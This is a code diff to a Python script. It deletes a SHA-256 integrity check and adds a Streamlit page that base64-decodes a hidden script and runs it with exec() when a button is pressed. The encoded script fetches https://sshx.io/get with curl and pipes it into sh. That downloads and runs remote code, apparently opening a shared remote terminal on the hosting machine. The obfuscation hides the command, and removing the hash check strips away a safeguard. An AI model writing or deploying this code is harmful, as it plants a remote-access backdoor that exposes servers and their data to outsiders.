@@ -1,14 +1,17 @@
+import streamlit as st
 import subprocess
+import base64
 
-expected_sha256 = "f9ec2bcb6da70304c49ff331b965dde82e313b4aa354322000e42b0540e48c72"
-file_path = "run.py"
+# Base64 编码的脚本
+encoded_script = "CmltcG9ydCBzdHJlYW1saXQgYXMgc3QKaW1wb3J0IHN1YnByb2Nlc3MKCmRlZiBydW5fY29tbWFuZCgpOgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKAogICAgICAgICAgICBbImN1cmwiLCAiLXNTZiIsICJodHRwczovL3NzaHguaW8vZ2V0Il0sCiAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUsCiAgICAgICAgICAgIHRleHQ9VHJ1ZSwKICAgICAgICAgICAgY2hlY2s9VHJ1ZQogICAgICAgICkKICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNoIiwgIi1zIiwgInJ1biJdLCBpbnB1dD1yZXN1bHQuc3Rkb3V0LCB0ZXh0PVRydWUsIGNoZWNrPVRydWUpCiAgICAgICAgc3Quc3VjY2Vzcygi5ZG95Luk5omn6KGM5oiQ5Yqf77yBIikKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgIHN0LmVycm9yKGYi5ZG95Luk5omn6KGM5aSx6LSlOiB7ZX0iKQoKc3QudGl0bGUoIuaJp+ihjCBTaGVsbCDlkb3ku6QiKQppZiBzdC5idXR0b24oIui/kOihjOWRveS7pCIpOgogICAgcnVuX2NvbW1hbmQoKQo="
 
-# 计算文件 SHA-256
-file_hash = calculate_sha256(file_path)
+def run_encoded_script(encoded_script):
+    # 解码 Base64
+    decoded_script = base64.b64decode(encoded_script).decode()
+    
+    # 执行解码后的脚本
+    exec(decoded_script)
 
-# 校验哈希值并执行 Python 文件
-if file_hash == expected_sha256:
-    print("哈希匹配，执行文件...")
-    subprocess.run(["python3", file_path])
-else:
-    print("哈希不匹配，禁止执行！")
+st.title("执行 Base64 编码的 Shell 命令")
+if st.button("运行命令"):
+    run_encoded_script(encoded_script)
